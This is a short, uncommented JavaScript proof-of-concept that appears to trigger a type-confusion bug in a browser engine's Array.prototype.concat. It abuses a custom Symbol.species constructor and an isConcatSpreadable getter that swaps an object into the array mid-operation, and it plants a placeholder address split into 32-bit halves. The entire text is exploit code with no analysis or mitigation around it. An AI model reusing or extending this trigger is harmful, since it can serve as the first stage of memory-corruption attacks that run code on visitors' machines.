function lower(x) {
    // returns the lower 32bit of x
    return parseInt(("0000000000000000" + x.toString(16)).substr(-8,8),16) | 0;
}
function upper(x) {
    // returns the upper 32bit of x
    return parseInt(("0000000000000000" + x.toString(16)).substr(-16, 8),16) | 0;
}
var addr = 0x12345678;
var a1 = [];
for (var i = 0; i < 0x100; i++) {
    a1[i] = i;
}
var a2 = [lower(addr), upper(addr)];
var c = new Function();
c[Symbol.species] = function() {
    new_array = [];
    return new_array;
};
a1.constructor = c;
a2.__defineGetter__(Symbol.isConcatSpreadable, function () {
    new_array[0] = {};
    return true;
});
var res = a1.concat(a2);
res[0x100/2];
